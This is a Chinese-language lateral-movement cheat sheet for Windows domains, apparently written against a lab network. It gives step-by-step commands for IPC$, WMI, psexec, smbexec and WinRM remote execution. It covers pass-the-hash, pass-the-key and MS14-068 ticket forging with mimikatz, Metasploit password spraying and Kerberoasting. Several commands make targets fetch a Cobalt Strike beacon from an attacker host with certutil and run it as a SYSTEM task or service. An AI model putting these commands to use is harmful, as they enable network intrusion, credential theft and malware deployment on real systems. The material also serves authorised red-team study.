IPC横向

IPC是专用管道，可以实现对远程计算机的访问，需要使用目标系统用户的账号密码，使用139、445端口。
利用流程：
1、建立IPC链接到目标主机
2、拷贝要执行的命令脚本到目标主机
3、查看目标时间，创建计划任务（at<2012、schtasks>2012）定时执行拷贝到的脚本
4、删除IPC链接
Windows2012以下系统可使用at命令创建计划任务执行木马上线
Default
# 建立ipc连接：
net use \\192.168.3.21\ipc$ "admin!@#45" /user:god.org\ad
ministrator 
#拷贝执行文件到目标机器
copy beacon.exe \\192.168.3.21\c$  
#添加计划任务
at \\192.168.3.21 15:47 c:\beacon.exe
Windows2012以上系统使用schtasks命令创建计划任务执行木马上线
Default
# 建立ipc连接：
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
ministrator 
#复制文件到其C盘
copy beacon.exe \\192.168.3.32\c$ 
#创beacon任务对应执行文件
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn beacon /sc DAILY /tr c:\beacon.exe /F 
#运行beacon任务
schtasks /run /s 192.168.3.32 /tn beacon /i 
#删除beacon任务
schtasks /delete /s 192.168.3.21 /tn beacon /f
常见问题:
Default
5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限
51：网络问题，Windows无法找到网络路径
53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题
67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$
1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除
1326：账号密码错误
1792：目标NetLogon服务未启动，连接域控常常会出现此情况
2242：用户密码过期，目标有账号策略，强制定期更改密码
建立IPC失败的原因:
Default
（a）目标系统不是NT或以上的操作系统
（b）对方没有打开IPC$共享
（c）对方未开启139、445端口，或者被防火墙屏蔽
（d）输出命令、账号密码有错误

WMI横向

WMI是通过135端口进行利用，支持明文用户密码或者hash的方式认证，并且该方法不会在目标日志系统留下痕迹。使用wmic远程执行命令，在远程系统中启动windows management lnstrumentation 服务（目标服务器需要开放135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标服务器开启了防火墙，wmic将无法进行连接。wmic命令没有回显，需要使用ipc$和type命令来读取信息，若使用wmic执行恶意程序，将不会留下日志。
利用前提和注意事项：
1、目标防火墙已事先允许135、445端口连入，且本地杀软、EDR未拦截wmic.exe,cmd.exe等执行；
2、有些域账户只允许在指定的域内机器上才可登录，所以如果发现账密是对的，却会提示 “拒绝访问” ；
3、出现提示”无效句柄” 之类的错误，可尝试把目标ip换成机器名或者把机器名换成ip，ip或机器名用双引号包起来；
4、当提示 “RPC服务器不可用”时，有可能是目标防火墙导致135端口不通，或者目标系统没开135端口，要么就是被对方杀软或EDR拦截。

1.wmic

无需上传第三方软件，利用系统内置程序，执行过程中有单模式执行和交互式执行
可以只执行命令，或者反弹shell
单命令执行，执行后无结果回显，可以将木马上传到该内网web目录下，然后调用文件
下载命令上线cs：
Default
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create "cmd.exe c:/beacon.exe"

也可以使用目标系统的cmd.exe执行一条命令，将执行结果保存在C盘的ip.txt文件中，
Default
wmic /node:192.168.1.3 /user:administrator /password:Admin!@#$4321 process call create "cmd.exe /c ipconfig >c:\ip.txt"

建立ipc$后，使用type命令读取执行结果：
Default
net use \\192.168.1.3\ipc$ "Admin!@#$4321" /user:administrator
type \\192.168.1.3\C$\ip.txt

2.cscript

利用系统内置命令，可获取交互式shell
（无法在cs中使用，因运行成功后会一直进行反弹连接，导致卡bug）
需上传wmiexec.vbs然后进入该服务器内进行执行。
Wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec功能。wmiexec.vbs可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell
Default
cscript //nologo wmiexec.vbs /shell 10.211.55.10 administrator admin!@#45

缺点：wmic和cscript都无法进行hash传递

3.wmiexec

第三方软件 (交互式&单执行)
无法在cs中执行后回显
Default
wmiexec ./administrator:admin!@#45@10.211.55.10 "whoami"
wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@10.211.55.10 "whoami"
可利用文件下载命令上线cs：
Default
wmiexec ./administrator:admin!@#45@10.211.55.10 "cmd.exe /c certutil -urlcache -split -f http://10.211.55.7/beacon.exe c:/beacon.exe"
wmiexec ./administrator:admin!@#45@10.211.55.10 "cmd.exe /c c:/beacon.exe"

缺点：第三方软件会被杀软查杀

SMB横向

利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。

1.psexec（windows官方工具）

可获取交互式shell使用工具为windows官方工具
下载地址
https://docs.microsoft.com/en-us/sysinternals/downloads/pstools
Default
PsExec64.exe \\10.211.55.10 -u administrator -p admin!@#45 -s cmd

2.psexec（impacket套件）

可获取交互式shell使用工具为impacket套件，可使用hash传递
Default
psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@10.211.55.10

因cs无法操作交互式命令，也可引用MSF回显反弹接受会话
CS创建监听
Default
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 8888
run

执行spawn msf


3.利用cs中的psexec上线内网不出网主机

探测网段主机存活，设置正向监听进行上线cs

4.smbexec
外部：(交互式)
Default
smbexec ./administrator:admin!@#45@192.168.3.32
smbexec god/administrator:admin!@#45@192.168.3.32
smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32

PTH-mimikatz

使用cs的mimikatz进行pth，发现执行后在目标主机上弹出cmd窗口，可利用进程窃取，直接在cs上进行远程操作。
Default
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:10.211.55.7 /ntlm:518b98ad4178a53695dc997aa02d455c
steal_token 3420
dir \\10.211.55.7\c$

可以看到运行mimikatz之后会生成的cmd进程。
利用cs进程劫持，劫持cmd进程，然后可发现成功执行目标机命令。
之后可复制文件，创建启动服务命令上线CS
Default
net use \\10.211.55.7\c$
copy beacon.exe \\10.211.55.7\c$
sc \\TALE2B52 create csshell binpath= "c:\beacon.exe"
sc \\TALE2B52 start csshell

PTK-mimikatz

如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击
pth：没打补丁用户都可以连接，打了补丁只能administrator连接
ptk：打了补丁才能用户都可以连接，采用aes256连接
利用流程
首先使用mimikatz获取aes256
Default
mimikatz sekurlsa::ekeys

攻击该域内其它主机，成功后返回cmd
Default
mimikatz sekurlsa::pth /user:administrator /domain:god /aes256:d55913af88d543d2411109270ea36c1c29a71de7a3156d61cd6989feb0f1ae57

PTT-ms14068

利用条件：
1.域控没有打MS14-068的补丁(KB3011780)
2.拿下一台加入域的计算机
3.有这台域内计算机的域用户密码和Sid
MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.
利用方法：
1、漏洞 MS14068(webadmin权限)
获取当前用户的SID值，并上传MS14-068漏洞利用文件，然后执行生成攻击域控主机的TGT凭据
Default
shell whoami/user
shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45
Default
# 获取当前主机票证
shell klist
# 然后清除票证
shell klist purge
# 使用mimikatz将生成的票证导入到内存中
mimikatz kerberos::ptc TGT_webadmin@god.org.ccache

使用如下命令，可成功读取域控主机C盘目录下文件。

注：
Kerberos认证协议中仅支持对计算机名进行认证，无法使用ip地址认证。
Default
shell dir \\OWA2010CN-GOD\c$

因域控所处环境通常不出网，可以通过该web主机进行转发，上线CS
创建beacon_bind_tcp端口为4444的监听器,并生成木马。


然后将此监听器生成的木马放到web主机，创建服务运行上线CS
Default
shell net use \\OWA2010CN-GOD\C$
shell copy dcbeacon.exe \\OWA2010CN-GOD\C$
shell sc \\OWA2010CN-GOD create 1dcbindshell binpath= "C:\dcbeacon.exe"
shell sc \\OWA2010CN-GOD start 1dcbindshell
connect 192.168.3.21

批量密码喷洒

在利用cs进行横向移动时，发现如果主机和口令数量足够多的话，比较影响效率，可以使用相关口令扫描工具进行密码喷射如超级弱口令扫描工具、ntscan等，然后进行集中利用。
下面使用cs派生到msf进行口令探测和利用：
首先cs建立msf监听器

设置msf
移交cs中的权限给msf
Default
# 查看路由，获取当前机器的所有网段信息
meterpreter > run get_local_subnets 
# 自动查看路由信息
meterpreter > run post/multi/manage/autoroute
Default
# 获取路由信息后添加路由
meterpreter > background 
msf6 exploit(multi/handler) > route add 192.168.3.0 255.255.255.0 1
# 获取路由地址信息：
meterpreter > run autoroute -p

使用msf批扫出smb账号密码
Default
use auxiliary/scanner/smb/smb_login
set threads 10
set rhosts 192.168.3.0/24
set smbdomain god
set user_file /root/user.txt
set pass_file /root/pass.txt
run

漏洞利用
Default
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set RHOSTS 192.168.3.32
set smbuser administrator
set smbpass admin!@#45
run

也可使用proxychains配合使用CrackMapExec
首先开启msf设置代理
Default
meterpreter > background 
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set SRVPORT 2233
msf6 auxiliary(server/socks_proxy) > run

更改proxychains.conf
Default
nano /etc/proxychains.conf

密码喷射
Default
root@tale:~# proxychains python3 ./cme smb 192.168.3.20-33 -u administrator -p 'admin!@#45'

WINRM横向

WinRM代表Windows远程管理，是一种允许管理员远程执行系统管理任务的服务。默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。
条件：
目标系统防火墙已事先允许5985(HTTP SOAP)或5986(HTTPS SOAP)端口连入
双方都启用的Winrm rs的服务
使用此服务需要管理员级别凭据。
Windows2008以上版本默认自动状态，Windows Vista/win7上必须手动启动；
Windows 2012之后的版本默认允许远程任意主机来管理。
目标系统本地杀软、EDR未拦截Winrs.exe、Powershell.exe，cmd.exe执行
攻击机开启：
Default
winrm quickconfig -q

可通过cs内置端口扫描5985来判断目标主机是否开启WinRM
使用ps命令查看开启情况
Default
powershell Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
连接执行：
Default
winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:admin!@#45 whoami

远程连接时可能会遇到以下错误
Default
Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。

在攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可
Default
winrm set winrm/config/Client @{TrustedHosts="*"}

上线CS:
Default
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe"
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 "cmd.exe /c c:/beacon.exe"

也可以使用cs内置插件

SPN横向

使用普通域用户上线cs，通过setspn扫描0day.org该域，通过该命令可以获取该域内主机名、角色、安装的服务等信息，进而可攻击拥有特定服务漏洞的机器。
Default
setspn -T 0day.org -q */*
setspn -T 0day.org -q */* | findstr "MSSQL"

请求的Kerberos服务票证的加密类型默认无设置情况下为AES256_HMAC_SHA1，该加密方式无法破解

当管理员将加密类型改为RC4_HMAC_MD5时，意味着服务帐户的NTLM密码哈希用于加密服务票证，可以通过以下命令判断使用哪种加密类型
Default
powershell Add-Type -AssemblyName System.IdentityModel
powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SqlServer.god.org:1433"

查看票证凭据发现当会话密钥类型为RC4_HMAC_MD5时，可进行票证导出破解

使用mimikatz导出票证
Default
mimikatz "kerberos::list /export"

下载破解脚本加载密码字典进行离线破解，需查找最容易包含弱密码的票据
Default
python tgsrepcrack.py pass.txt "1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi"

或可以使用服务票据改写密码：
Default
python kerberoast.py -p Admin12345 -r 0DAY.ORG1.kirbi -w 0DAY.ORG.kirbi -u 500
python kerberoast.py -p Admin12345 -r 0DAY.ORG1.kirbi -w 0DAY.ORG.kirbi  -g 512

使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。
Default
kerberos::ptt 0DAY.ORG.kirbi